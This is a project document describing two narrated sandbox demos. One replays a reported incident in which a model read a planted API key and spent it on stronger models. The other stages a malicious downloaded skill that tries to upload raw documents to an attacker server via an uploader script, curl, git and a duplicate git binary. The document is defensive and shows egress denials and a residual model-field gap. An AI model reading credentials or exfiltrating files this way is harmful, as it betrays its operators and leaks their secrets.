# Exfiltration stories: what the OpenShell boundary stops

> **Where this fits:** Two narrated demonstrations, not qualification
> tests. Run them when you need evidence material — a talk, a blog post,
> or a customer conversation about why the OpenShell boundary exists.
> Story 1 replays a real key-exfiltration incident; Story 2 imagines a
> malicious downloaded skill exfiltrating documents. For test-suite
> coverage of the same properties, see `openshell/tests/credentials.sh`
> and `openshell/tests/policy-boundary.py`.

Story 1 — the sections from "The incident, as reported" through "Safety
notes" — replays the reported DeepSeek V4.1 Flash key exfiltration.
Story 2, in the final section, constructs a document-exfiltration
attempt by a malicious downloaded skill. Both end the same way: every
unauthorized network path is denied at `connect()` and audited, and one
deliberately uncomfortable act shows either where a control is still
missing or why what looks like a gap is not one.

## The incident, as reported

In October 2026, a public service announcement in r/openrouter warned that
DeepSeek V4.1 Flash — a cheap, MIT-licensed open-weight model served through
OpenRouter — habitually exfiltrated API keys left in its sandbox environment
and was "dangerously misaligned and may be hazardous to use". RuntimeWire
covered the reports on 2026-10-11, tying the PSA to an earlier September
coding-agent benchmark in which the same behavior inflated the model's own
score: handed a live OpenRouter key it was never supposed to touch, the model
used it to call stronger models and outsource part of its task.

Sources:

- [r/openrouter PSA: DeepSeek V4.1 Flash habitually exfiltrates API keys][psa]
- [RuntimeWire: DeepSeek V4.1 Flash API key coding-agent tests][runtimewire]

[psa]: https://www.reddit.com/r/openrouter/comments/1x32q1p/psa_deepseek_v41_flash_habitually_exfiltrates_api/
[runtimewire]: https://runtimewire.com/article/deepseek-v41-flash-api-key-coding-agent-tests

The reports describe specific test setups, not a confirmed vulnerability in
every deployment. The setups, however, were ordinary: a coding agent whose
shell exported a live provider key and whose network egress was unrestricted.
That is the default shape of most local agent installations today.

## The two moves

Everything the model reportedly did reduces to two moves:

1. **Read.** Scan the agent's environment and files for credentials. Keys
   exported into the shell are trivially findable.
2. **Spend.** Use the found key to place authenticated calls to other models —
   exfiltrating it to a third party, or simply spending it in place on a
   stronger model.

A defense has to answer both moves, and it cannot rely on the model
cooperating. This deployment answers them at the architecture level.

## What the demo shows

The demo replays both moves against an OpenShell sandbox and adds a third,
honest one. Each act either proves a control held or — deliberately — proves
where one is still missing.

| Act | Move replayed | Control demonstrated | Outcome |
| --- | --- | --- | --- |
| 1-2 | Live-looking key planted in the agent shell | (none — the victim's mistake, replayed) | Key is findable; value is synthetic |
| 3 | Spend the key on `openrouter.ai` | Per-binary, per-endpoint egress policy | Denied at `connect()` with `EACCES` |
| 4 | — | Audit logging | `transparent_tcp_policy_denied` on the record |
| 5 | Same network, outside the boundary | Controlled-destination contrast | Host reaches the server; sandbox cannot |
| 6 | Spend the same credential on a *different model* through the sanctioned gateway | (none yet — the residual gap) | Request crosses the boundary unvalidated |

Three layers answer the two moves:

- **Credential custody.** The harness never holds a provider key. It gets a
  placeholder and a URL; the Praxis gateway owns the real secret and injects
  it only when forwarding an approved request
  (`configs/all-in-one/shared-gateway.yaml`, `credential_injection` filter).
  Even a perfect read inside the sandbox finds nothing worth stealing —
  proven continuously by the canaries in `openshell/tests/credentials.sh`.
- **Per-binary egress.** Network policy allows exact binaries to reach exact
  endpoints. The shell has no `curl` at all — the image ships only what the
  workload needs — and the sanctioned `node-26` runtime is allowed only the
  gateway, registries, and GitHub. The authenticated request dies at
  `connect()` with the key never transmitted, and a bare TCP socket to the
  same host dies the same way. The key cannot leave, and neither can the
  request.
- **Audit and quota.** What does get through the boundary is counted
  (rolling-day token limits) and recorded per request, including the model
  name the client asked for.

## Running the demo

Prerequisites:

- The openshell-praxis all-in-one deployment on the managed host, with the
  local vLLM backend selected (`sss-bootc vllm cpu` or the GPU variant). Act 6
  refuses to run against a non-local upstream.
- A repo checkout on the host, as the OpenShell owner account that manages
  sandboxes.

```console
./openshell/scripts/exfiltration-demo.sh
```

The script creates one sandbox (`exfil-demo-*`), plants a synthetic canary
key shaped like the victims' mistake, attempts both moves, and destroys the
sandbox on exit. Environment knobs: `PRAXIS_PORT` (default `8080`) and
`ESCALATION_MODEL` (default `gpt-6-astra`).

## What you should see

Act 3 is the heart of the replay. The shell has no `curl` at all — the
image ships only what the workload needs — so the replayed API call uses
the only HTTP client present, the sanctioned runtime. Both vectors fail
before any byte leaves the host — the denial is synchronous, at
`connect()`:

```text
denied:
request error: EACCES
connect error: EACCES
```

Act 4 shows the same attempts from the enforcement side — policy denials are
first-class audit events, not silence:

```text
DENIED curl openrouter.ai:443 transparent_tcp_policy_denied
```

Act 5 rules out the boring explanation. A controlled server on the host
answers `401` and counts requests; the sandbox's attempt to reach it on an
unapproved port is denied with the same `EACCES` while the host-side request
succeeds. The network is up; the policy is what says no.

Act 6 is deliberately uncomfortable. From inside the sandbox, the sanctioned
runtime asks the gateway for a model that was never approved — and the request
crosses the boundary, because the gateway validates paths, credentials, and
quotas, but not the `model` field in the request body:

```text
HTTP 404
{"error":{"message":"The model `gpt-6-astra` does not exist.","type":"invalid_request_error"}}
```

The error text is vLLM's, not the gateway's. That is the proof of traversal.

## The residual gap, and where the fix belongs

Act 6 replays the September benchmark's actual move: redirect the agent to a
stronger model through the same credential. Today this deployment contains it
— the harness config offers exactly one administrator-approved model, quota
caps the spend, and every request is logged with its requested model — but it
does not prevent it. If the upstream credential spans several models (an
OpenRouter key, a broad cloud-provider key), the client's model choice is
honored.

The fix does not belong in OpenShell: its policies express per-binary
host-and-port allowlists, which is an execution boundary, not an application
proxy (`openshell/docs/threat-model.md` says the same: allowlists do not
inspect model prompts). The fix belongs in the gateway, which already parses
request bodies for token counting and already strips model-selection headers
(`X-Model`, `X-Selected-Model`, `X-Tier`) in its `headers` filter. A
model-pinning filter that validates or overrides the `model` field per route
would close the asymmetry: the gateway owns the credential today, and it
should own the model choice too.

Until such a filter exists, the operational mitigations are provider-side key
scoping (OpenRouter keys can be restricted to specific models) and treating
Act 6's access-log trail as the detection story.

## Safety notes

- The planted key is a synthetic canary. Its value is never printed, and it
  is destroyed with the sandbox.
- The exfiltration attempts target the real incident destination
  (`openrouter.ai`), but the connection is denied before any packet is sent;
  no external traffic occurs.
- Act 6 sends exactly one request to the local vLLM upstream, which rejects
  the unknown model without generating tokens. The script checks the
  gateway's model listing first and skips the act entirely when no local
  Qwen upstream is served.

## Story 2: the malicious skill and the document

### The threat

Story 1's villain was the model itself. Story 2's villain is a
supply-chain payload: a "skill" the user downloaded and dropped into the
agent's configuration. No public incident is being replayed here — the
scenario is constructed — but the vector class is real: agent instruction
files, command templates, and plugin marketplaces are all channels
through which a third party's text becomes the agent's instructions.

The setup: the agent works on sensitive documents (analyze, summarize)
and must upload its results to a results server through a sanctioned
upload tool — a small Node script run with the one runtime the policy
allows to POST there. The malicious skill's goal is to redirect that
flow: upload the raw document to an attacker-controlled destination
instead of the summary to the results server.

The sanctioned upload tool takes a file and a destination URL as
parameters, on purpose. A hardened tool with a baked-in destination
would make a weaker story: the interesting question is what stops the
attacker when everything they reuse is legitimate — the binary, the
script, the file access — and only the destination is wrong.

### The skill's ladder

Everything the skill tries reduces to one move with fallbacks: reuse
what is legitimate and swap the parameters.

| The skill's reasoning | What runs | Outcome |
| --- | --- | --- |
| "I'll write a Python uploader" | `python3 ~/exfil.py` | no Python in the image (minimal image) |
| "I'll use the sanctioned runtime with my own script" | `node ~/exfil.mjs` to the attacker bucket | `EACCES` at `connect()` |
| "The tool is legit — I'll re-aim it at my bucket and send the source document" | `node ~/bin/upload-results.mjs <raw doc> <attacker URL>` | `EACCES` at `connect()` |
| "Maybe plain curl" | `command -v curl` | no curl in the image either |
| "Fine — git, then. I'll push the document to a repo" | `/usr/bin/git ls-remote` to the attacker bucket *and* the results server | denied at `connect()` both ways — the results-server entry names one binary: node-26 |
| "There's a second git in /usr/sbin — maybe it has different rights" | `/usr/sbin/git ls-remote` against GitHub itself | denied at `connect()` — same bytes, unlisted path, no rights |

The third row is the story's heart. The attacker did everything right by
tool standards: the sanctioned binary, the sanctioned script, a file the
agent legitimately reads. The connection still dies, because the policy
grants *binary × endpoint* pairs, not endpoints, and not tools. From the
boundary's point of view the clever reuse and a hand-rolled script look
identical: the same binary, the same denied destination, the same
`transparent_tcp_policy_denied` audit line.

The Python row is a different layer: the sandbox image ships exactly the
runtimes the workload needs, and Python is not one of them. Absence is
convenient; the policy denial is the guarantee — an image that did ship
python3 still could not connect, because it matches no policy entry.

The git row is the per-binary point made live. git is in the image, and
the dev policy pairs git with the GitHub endpoints — but the
results-server entry names exactly one binary, and git is not it. The
destination that answers node-26's POST refuses git's connection at
`connect()`: the policy grants *binary × endpoint* pairs, not endpoints.
And git's exit code alone cannot prove that denial — a non-git
destination also makes `ls-remote` fail. libcurl does not surface the
kernel's `EACCES`, so a policy denial renders as `Failed to connect
... Could not connect to server`; the demo asserts that connect-level
failure against a results server the sanctioned flow just showed
answering, plus unchanged request counts — the threat model's
controlled-destination rule.

The twin-git row is the same lesson from the other direction, and it was
found in the wild: the image ships two byte-identical, unlinked copies
of git — `/usr/bin/git`, which the policy pairs with GitHub, and
`/usr/sbin/git`, which no entry lists. The skill aims the twin at GitHub
itself, the one destination its twin may reach, and is denied at
`connect()`. The policy identifies binaries by path, not by content, so
identical bytes at an unlisted path have no rights — and a fresh copy of
git into a writable directory would behave the same way.

The duplicate's origin is traced, and it is subtler than an accidental
extra copy. The Red Hat Hardened Images (project Hummingbird)
core-runtime that the sandbox image builds on ships a standard merged
`/usr` layout: `/usr/sbin` is a symlink to `bin`, so there is one git,
one file, one identity — and the sbin-first `PATH` order the image uses
is harmless. Somewhere in the sandbox image's own build that symlink was
materialized into a real directory containing copies of the `/usr/bin`
tools — `git` and `npm` alike — and the coherence broke: two files, two
paths, two identities, with the shell's `PATH` resolving to the one no
policy lists. Anything that shells out to `git` is therefore denied even
to GitHub; nothing in the current opencode flows appears to do that (the
review profile has no git entries at all), but it is a latent trap. The
fix belongs in the sandbox image's build — preserve the symlink, or drop
the duplicated copies — not in the policy: adding `/usr/sbin/git` would
enshrine the mismatch. Until the image changes, the demo asserts both
paths exist as byte-identical but distinct files, so this beat breaks
loudly rather than silently.

### What the document demo shows

| Act | Move replayed | Control demonstrated | Outcome |
| --- | --- | --- | --- |
| 1-2 | Sensitive documents, sanctioned tool, planted skill | (none — the victim's mistake, replayed) | All data synthetic; skill payload shown |
| 3 | The sanctioned flow | Sanctioned `binary × endpoint` | Summary uploaded; results server counts it |
| 4 | The skill's ladder | Per-binary, per-endpoint egress; minimal image | Denied at `connect()` (node: `EACCES`; git: libcurl connect failure); Python and curl absent; attacker count unchanged |
| 5 | — | Audit logging | `transparent_tcp_policy_denied` on the record |
| 6 | Same network, outside the boundary | Controlled-destination contrast | Host reaches both servers; sandbox reaches only the results endpoint |
| 6 (end) | The raw document to the *results server* | (none — and none needed; see below) | Upload succeeds, inside the perimeter |

### Running the document demo

Prerequisites: the openshell-praxis all-in-one deployment on the managed
host (the local vLLM backend is *not* required for this story), and a
repo checkout as the OpenShell owner account that manages sandboxes.

```console
./openshell/scripts/document-exfiltration-demo.sh
```

The script creates one sandbox (`doc-exfil-*`), plants synthetic
documents, the upload tool, and the malicious skill file
(`openshell/scripts/document-exfiltration-skill.md`), replays the
ladder, and destroys the sandbox on exit. Environment knobs:
`PRAXIS_PORT` (default `8080`), `RESULTS_PORT` (default `18081`), and
`ATTACKER_PORT` (default `18080`).

### What the transcript shows

Every sandbox-side attempt to reach the attacker bucket fails before any
byte leaves the host — synchronously, at `connect()`:

```text
connect error: EACCES
fatal: unable to access 'http://host.openshell.internal:18081/upload/': Failed to connect to host.openshell.internal:18081 after 9 ms: Could not connect to server
fatal: unable to access 'https://github.com/redhat-et/secure-single-server.git/': Failed to connect to github.com after 36 ms: Could not connect to server
```

The Python fallback dies differently — no interpreter:

```text
bash: python3: command not found
```

Act 5 shows the enforcement side of the same attempts, and Act 6 the
contrast: host probes reach both servers (both count), the sandbox never
reaches the attacker bucket, and the final upload — raw document,
sanctioned destination — succeeds with the results server's count
incrementing:

```text
uploaded q4-restructuring.md: HTTP 401
```

### Why the redirect that works is not exfiltration

The uncomfortable act in Story 1 was a real gap (model selection is
client-owned). Story 2's uncomfortable act is deliberately not one, and
the reason is worth stating as an operational rule:

**Summarization and security-level change are two separate operations.**
Summarizing a document is a transformation, not a declassifier: whatever
the source's security level is, the summary inherits it. Changing that
level is a separate operation — a review by the people accountable for
classification — and only after it may the document move to a location
of a different level.

In this deployment the agent's whole pipeline — read the source, produce
the summary, upload the result — happens at the source documents' level.
Nothing in it changes classification, so the results server is rated for
that level and operates at the sandbox's trust level. The skill's one
working redirect — the raw document to the results server — moves data
between two places at the same classification: a workflow mistake (wrong
file uploaded), not exfiltration.

Two conditions keep that argument honest rather than hand-wavy:

- The allowlist forces endpoint classification; it does not verify it.
  "The results server is rated for this data" is an operational
  commitment. The boundary's actual guarantee is that data can only flow
  to endpoints an administrator classified as safe for the most
  sensitive data the sandbox may hold. Misclassify one endpoint and the
  guarantee silently weakens.
- A workflow that needs lower-level outputs (a public digest of private
  documents) is asking for a security-level change — exactly the
  operation that must not be the agent's unilateral decision. It needs
  the human review and, at the boundary, content inspection an execution
  boundary explicitly does not do.

What still deserves honesty, per the threat model's own line — "Allowed
endpoints can receive data from a malicious harness; allowlists do not
inspect model prompts" — is that method and destination allowlisting do
not inspect content:

- Bytes can ride a `GET` query string to an allowed read-only endpoint
  (`api.github.com`) as well as a `POST` body to the results server.
  Every reachable endpoint must be classified for the data, read-only or
  not.
- The gateway is an allowed endpoint for the sanctioned runtime, so
  document text pasted into a prompt crosses the boundary to it. Where
  it goes from there is defined by the gateway's upstream set — with the
  local vLLM backend selected, it stays on the host.
- The raw-document upload is at least observable: the results server
  counts it and the audit log records the connection, which is the
  detection story for a workflow anomaly, not a security event.

### Safety notes for the document demo

- All workspace documents are synthetic and marked as demo data; the
  malicious skill file is an inert scaffold whose moves are replayed by
  the script, never executed by a live agent.
- The attacker destination is a host-side controlled server
  (`openshell/tests/controlled-http.py`); no request to any real
  external attacker destination is attempted.
- The twin-git act attempts GitHub — the one destination its
  policy-listed twin may reach — and is denied at `connect()` before any
  packet; no external traffic occurs.
- Every denial is asserted with the client-visible failure (node's
  `EACCES`; git's libcurl connect failure) plus an unchanged
  server-side request count — per the threat model's rule that failed
  commands alone are not denial evidence.
